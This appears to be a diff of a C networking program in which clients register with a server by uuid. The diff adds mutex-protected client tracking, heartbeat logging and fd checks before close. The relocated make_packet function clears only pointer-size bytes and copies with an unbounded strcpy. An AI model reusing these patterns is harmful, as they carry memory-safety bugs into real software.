@@ -22,31 +22,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include <errno.h>
+#include <pthread.h>
 
 list_p client_list = NULL;
-
-struct packet *make_packet(unsigned long t, unsigned long f, char *v, struct packet *p)
-{
-    bzero(p, sizeof(p));
-    p->type = t;
-    p->flag = f;
-    strcpy((char*)&(p->value), (const char*)v);
-    
-    return p;
-}
-
-struct packet *parse_packet(struct packet *p)
-{
-    unsigned long type = p->type;
-    unsigned long flag = p->flag;
-    char *buff = (char *)&(p->value);
-
-    printf("packet type: %lu\n", type);
-    printf("packet flag: %lu\n", flag);
-    printf("packet value:%s\n", buff);
-
-    return p;
-}
+pthread_mutex_t client_list_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 int certify_register_packet(struct packet* p)
 {
@@ -66,8 +45,35 @@ int certify_register_packet(struct packet* p)
 
 int alexjlz_register(struct client *c)
 {
-    //list_add(client_list, c, sizeof(struct client)); 
-    alexjlz_log("client <<%s>> (ip:%s)  register success!\n", c->uuid, c->ip);
+    pthread_mutex_lock(&client_list_mutex);
+    struct client *c_iter = NULL;
+    list_iter_p client_list_iter = list_iterator(client_list, FRONT);
+
+    while ( (c_iter = list_next(client_list_iter)) != NULL )
+    {
+        if ( strcmp(c->uuid, c_iter->uuid) == 0 )
+        {
+            // update info
+            alexjlz_log("client <<%s>> (ip:%s)  heartbeat report!\n", c->uuid, c->ip);
+            break;
+        }
+    }
+    if ( c_iter == NULL )
+    {
+        alexjlz_log("client <<%s>> (ip:%s)  register success!\n", c->uuid, c->ip);
+        list_add(client_list, c, sizeof(struct client));
+    }
+
+    /* the following code can be used to iterate client_list
+    client_list_iter = list_iterator(client_list, FRONT);
+
+    while ( (c_iter = list_next(client_list_iter)) != NULL )
+    {
+        alexjlz_log("client <<%s>> (ip:%s)\n", c_iter->uuid, c_iter->ip);
+    }
+    */
+
+    pthread_mutex_unlock(&client_list_mutex);
     return 0;
 }
 
@@ -105,13 +111,15 @@ void *serve ( void *arg )
     if ( retval == -1 )  // error
     {
         alexjlz_log("Error, select retval == -1\n");
-        close(client_fd);
+        if ( check_fd(client_fd) )
+            close(client_fd);
         return ;
     }
     else if ( retval == 0 ) // timeout
     {
         alexjlz_log("Error, select timeout\n");
-        close(client_fd);
+        if ( check_fd(client_fd) )
+            close(client_fd);
         return;
     }
     bytes_read = readn ( client_fd, &p, sizeof(p) );  // else readable
@@ -125,7 +133,8 @@ void *serve ( void *arg )
     if ( (p.type != packet_register) || !certify_register_packet(&p) )
     {
         alexjlz_log("Error, client's first packet is not of type register\n");
-        close(client_fd);
+        if ( check_fd(client_fd) )
+            close(client_fd);
         return ;
     }
     parse_string(p.value, c.uuid, "uuid");
@@ -138,6 +147,8 @@ void *serve ( void *arg )
 
 int ask_for_service( int server_fd )
 {
+    extern char uuid[32];
+
     int bytes_read = 0;
     int bytes_write = 0;
     struct packet p; // client (self)
@@ -147,12 +158,13 @@ int ask_for_service( int server_fd )
 
     randomstr(random_str, 20);
     alexjlz_hash(random_str, hash);
-    sprintf(p.value, "random_str:%s hash:%s", random_str, hash);
+    sprintf(p.value, "random_str:%s hash:%s uuid:%s", random_str, hash, uuid);
     p.type = packet_register;
     if (writen(server_fd, &p, sizeof(p)) != sizeof(p) )
     {
         fprintf(stderr, "Error: writen\n");
-        close(server_fd);
+        if ( check_fd(server_fd) )
+            close(server_fd);
         return -1;
     }
     
@@ -182,4 +194,28 @@ int send_output(FILE *output, int server_fd)
         
     return 0;
 }
+
+struct packet *make_packet(unsigned long t, unsigned long f, char *v, struct packet *p)
+{
+    bzero(p, sizeof(p));
+    p->type = t;
+    p->flag = f;
+    strcpy((char*)&(p->value), (const char*)v);
+    
+    return p;
+}
+
+struct packet *parse_packet(struct packet *p)
+{
+    unsigned long type = p->type;
+    unsigned long flag = p->flag;
+    char *buff = (char *)&(p->value);
+
+    printf("packet type: %lu\n", type);
+    printf("packet flag: %lu\n", flag);
+    printf("packet value:%s\n", buff);
+
+    return p;
+}
+
 */
